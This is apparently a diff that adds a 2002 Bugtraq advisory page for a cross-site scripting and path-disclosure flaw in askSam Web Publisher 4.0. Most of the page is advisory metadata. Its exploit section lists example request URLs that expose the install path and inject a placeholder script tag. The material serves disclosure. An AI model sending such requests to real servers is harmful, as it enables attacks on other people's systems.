@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid4670<p><b><span style="font-size: 18pt;">askSam Web Publisher Cross Site Scripting Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/4670/info">info</a><br><a href="http://www.securityfocus.com/bid/4670/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/4670/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/4670/solution">solution</a><br><a href="http://www.securityfocus.com/bid/4670/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				4670
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 05 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 05 2002 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Posted to BugTraq on May 5, 2002 by frog frog &lt;leseulfrog@hotmail.com&gt;
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					askSam systems askSam Web Publisher 4.0 <br/>
+<span class="related">
+						
+							-
+						
+						askSam systems askSam 4.0 <br/>
+</span>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	The following examples will display an error message containing the complete path to the askSam directory:<br/>http://somewhere/as_web.exe?Command=search&amp;file=non-existant-file&amp;request=&amp;MaxHits=10&amp;NumLines=1<br/>http://somewhere/as_web.exe?non-existant<br/>http://somewhere/as_web4.exe?Command=First&amp;File=non-existant-file<br/><br/>These examples demonstrate the cross site scripting issue:<br/>/as_web4.exe?existant-ask-file!!.ask+B+&amp;lt;script&amp;gt;ANYSCRIPT&amp;lt;/script&amp;gt;<br/>/as_web.exe?existant-ask-file!!.ask+B+&amp;lt;script&amp;gt;ANYSCRIPT&amp;lt;script&amp;gt;
+	
+		<ul>
+</ul>
+</div>
